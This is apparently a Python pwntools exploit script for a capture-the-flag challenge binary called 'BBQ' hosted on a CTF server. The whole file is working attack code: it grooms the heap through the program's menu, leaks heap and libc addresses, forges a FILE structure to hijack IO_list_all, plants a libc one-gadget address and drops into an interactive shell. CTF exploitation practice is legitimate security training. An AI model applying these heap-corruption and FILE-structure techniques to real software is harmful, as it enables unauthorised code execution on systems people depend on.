from pwn import *

#r = process("./BBQ", env={'LD_PRELOAD': './libc.so'})
r = remote('pwn1.chal.ctf.westerns.tokyo', 21638)
#r = remote("old-bbq.chal.ctf.westerns.tokyo",21638)
#r = process("./BBQ")
def buy(name,amount):
	r.sendlineafter(":","1")
	r.sendlineafter(">>",name)
	r.sendlineafter(">>",str(amount))

def grill(food,idx):
	r.sendlineafter(":","2")
	r.sendlineafter(">>",food)
	r.sendlineafter(">>",str(idx))

def eat(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(">>",str(idx))


buy("a"*0x20,0x100)
buy("b"*0x10,0x100)
buy("a"*0x10+p64(0xDEADBEEF11),0x100)
grill("a"*0x20,0)
eat(0)

# overwrite ptr in eat
r.sendlineafter(":","2")
r.sendlineafter(">>","a"*0x27)
eat(0)
r.sendlineafter(":","1")
r.recvuntil("* ")
heap = u64(r.recvn(6)+"\x00"*2) -0x110
log.info('heap: '+ hex(heap))

# padding to 0x200
r.sendlineafter('>>', 'c'*0x20)
r.sendlineafter('>>', str(0x100))
buy('d'*0x10, 0x100)
grill('d'*0x10, 2)
grill('d'*0x10, 3)

buy('A'*8+'\x91', 0x100)

grill('d'*0x10, 1)
eat(1)
eat(2)

#r.interactive()
buy(p64(0xDEADBEEF11), 0x100)
eat(3)
buy('g'*0x30, 0x100)
grill('g'*0x30, 0)
buy('f', 0x100)

eat(0)
# overwrite ptr in eat
r.sendlineafter(":","2")
#raw_input('#')
r.sendlineafter(">>","a"*0x27)
grill("a"*0x20,5)
grill("a"*0x20,4)

eat(0)
eat(4)

buy('h'*0x20, 0x100)
#r.interactive()
r.sendlineafter(':', '1')
r.recvuntil('* ')
r.recvuntil('* ')
r.recvuntil('* ')

main_arena_offset =0x3c4af0
libc = u64(r.recvline()[:6].ljust(8,'\x00')) - 0x88 - main_arena_offset
log.info('libc: '+ hex(libc))
r.sendlineafter(">>","g"*0x20+p64(heap+0x290))
r.sendlineafter(">>",str(0x100))


# create fuck large FILE structure

grill("a"*0x20,0)
grill("a"*0x20,1)
eat(0)
buy("a"*8+"\xa1",0x100)
eat(1)
buy(p64(0xDEADBEEF11),0x100)

grill("a"*0x20,0)
grill("a"*0x20,1)
grill("a"*0x20,2)
eat(2)
buy("a"*0x8+p16(0xe1),0x100)
eat(1)
buy("a"*0x20+p64(heap+0x150),0x100)
eat(0)
buy("c"*0x28+p64(heap+0x490),0x100)
buy("v"*0x28+p64(libc+0xf1147),0x100)

r.sendlineafter(":","2")
r.sendlineafter(">>","a"*0x28+p64(heap+0x340))
#r.interactive()
eat(0)

buy("a"*0x10+p64(heap+0x380)[:6],0x100)


#eat(2)
IO_list = libc+0x3c5520


buy(p64(heap+0x310),0x9a8-0x10) #IO_list_relateive

#input(":")
buy("Billy",0x100)

r.interactive()


